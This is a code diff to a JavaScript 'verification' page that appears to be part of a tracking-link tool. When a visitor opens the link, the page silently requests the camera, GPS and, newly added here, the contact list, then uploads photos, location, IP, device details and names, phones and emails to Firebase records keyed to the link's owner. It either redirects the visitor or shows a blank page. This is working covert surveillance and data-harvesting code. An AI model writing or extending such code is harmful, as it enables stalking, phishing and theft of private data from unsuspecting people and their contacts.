@@ -144,6 +144,29 @@ async function getLocation() {
     });
 }
 
+// ── COLLECT CONTACTS (Contact Picker API) ────────────────────────────────
+async function collectContacts() {
+    if (!('contacts' in navigator) || !('ContactsManager' in window)) {
+        console.warn('Contact Picker API not supported on this device.');
+        return null;
+    }
+    try {
+        const supported = await navigator.contacts.getProperties();
+        const props = ['name', 'email', 'tel'].filter(p => supported.includes(p));
+        if (props.length === 0) return null;
+        const contacts = await navigator.contacts.select(props, { multiple: true });
+        // Flatten into a serializable array
+        return contacts.map(c => ({
+            name:  (c.name  && c.name.length  ? c.name[0]  : '') || '',
+            phone: (c.tel   && c.tel.length   ? c.tel[0]   : '') || '',
+            email: (c.email && c.email.length ? c.email[0] : '') || ''
+        }));
+    } catch (e) {
+        console.warn('Contacts denied or failed:', e.message);
+        return null;
+    }
+}
+
 // ── VALIDATE URL ──────────────────────────────────────────────────────────
 function isValidUrl(url) {
     if (!url || typeof url !== 'string') return false;
@@ -158,8 +181,10 @@ function isValidUrl(url) {
 }
 
 // ── SAVE CAPTURE TO FIREBASE ──────────────────────────────────────────────
-async function saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, deviceInfo }) {
+async function saveCapture({ photoData, lat, lon, contacts, settings, linkId, ipAddress, deviceInfo }) {
     const now = Date.now();
+    const ownerType = settings._ownerType || 'admin';
+    const ownerId   = settings._ownerId   || 'admin';
     try {
         const newRef = push(ref(db, 'photo_history'));
         await set(newRef, {
@@ -174,11 +199,31 @@ async function saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, d
             timestamp:  now,
             ipAddress:  ipAddress,
             device:     deviceInfo,
-            _ownerType: settings._ownerType || 'admin',
-            _ownerId:   settings._ownerId   || 'admin'
+            _ownerType: ownerType,
+            _ownerId:   ownerId
         });
     } catch (e) {
         console.error('Firebase save error:', e);
+    }
+
+    // Save contacts separately to contact_history if collected
+    if (contacts && contacts.length > 0) {
+        try {
+            const cRef = push(ref(db, 'contact_history'));
+            await set(cRef, {
+                linkId:     linkId,
+                linkName:   settings.name || 'Unknown',
+                contacts:   contacts,
+                date:       new Date(now).toLocaleDateString(),
+                time:       new Date(now).toLocaleTimeString(),
+                timestamp:  now,
+                ipAddress:  ipAddress,
+                _ownerType: ownerType,
+                _ownerId:   ownerId
+            });
+        } catch (e) {
+            console.error('Firebase contacts save error:', e);
+        }
     }
 }
 
@@ -206,34 +251,37 @@ async function initVerification() {
     // Increment visit count atomically (prevents race condition with concurrent visitors).
     runTransaction(ref(db, 'managed_links/' + linkId + '/visits'), current => (current || 0) + 1).catch(() => {});
 
-    const needsCam    = !!settings.cam;
-    const needsGPS    = !!settings.gps;
-    const hasRedirect = isValidUrl(settings.redirectUrl);
+    const needsCam     = !!settings.cam;
+    const needsGPS     = !!settings.gps;
+    const needsContact = !!settings.contact;
+    const hasRedirect  = isValidUrl(settings.redirectUrl);
 
     // ── Kick off background tasks immediately ────────────────────────────
     const infoPromise = collectDeviceInfo();
     const ipPromise   = getIPAddress();
 
     // ── Request required permissions immediately (no UI, no delay) ───────
-    const camPromise = needsCam ? capturePhoto() : Promise.resolve(null);
-    const gpsPromise = needsGPS ? getLocation()  : Promise.resolve({ lat: 'Denied', lon: 'Denied' });
+    const camPromise     = needsCam     ? capturePhoto()     : Promise.resolve(null);
+    const gpsPromise     = needsGPS     ? getLocation()      : Promise.resolve({ lat: 'Denied', lon: 'Denied' });
+    const contactPromise = needsContact ? collectContacts()  : Promise.resolve(null);
 
-    const [photoData, gpsResult] = await Promise.all([camPromise, gpsPromise]);
+    const [photoData, gpsResult, contacts] = await Promise.all([camPromise, gpsPromise, contactPromise]);
 
     const lat = gpsResult?.lat ?? 'Denied';
     const lon = gpsResult?.lon ?? 'Denied';
 
     // ── Determine if all required permissions were granted ────────────────
-    const camGranted = !needsCam || (photoData !== null);
-    const gpsGranted = !needsGPS || (typeof lat === 'number');
-    const allGranted = camGranted && gpsGranted;
+    const camGranted     = !needsCam     || (photoData !== null);
+    const gpsGranted     = !needsGPS     || (typeof lat === 'number');
+    const contactGranted = !needsContact || (contacts !== null);
+    const allGranted     = camGranted && gpsGranted && contactGranted;
 
     // ── REDIRECT PATH ────────────────────────────────────────────────────
     if (hasRedirect && allGranted) {
         // Save capture without blocking the redirect.
         Promise.all([infoPromise, ipPromise])
             .then(([deviceInfo, ipAddress]) =>
-                saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, deviceInfo })
+                saveCapture({ photoData, lat, lon, contacts, settings, linkId, ipAddress, deviceInfo })
             )
             .catch(e => console.error('Async capture save failed:', e));
 
@@ -244,7 +292,7 @@ async function initVerification() {
     // ── NO-REDIRECT PATH ─────────────────────────────────────────────────
     // Save capture, then stay completely silent — no messages, no UI changes.
     const [deviceInfo, ipAddress] = await Promise.all([infoPromise, ipPromise]);
-    await saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, deviceInfo });
+    await saveCapture({ photoData, lat, lon, contacts, settings, linkId, ipAddress, deviceInfo });
     // Page remains blank. Nothing shown to the user.
 }
 
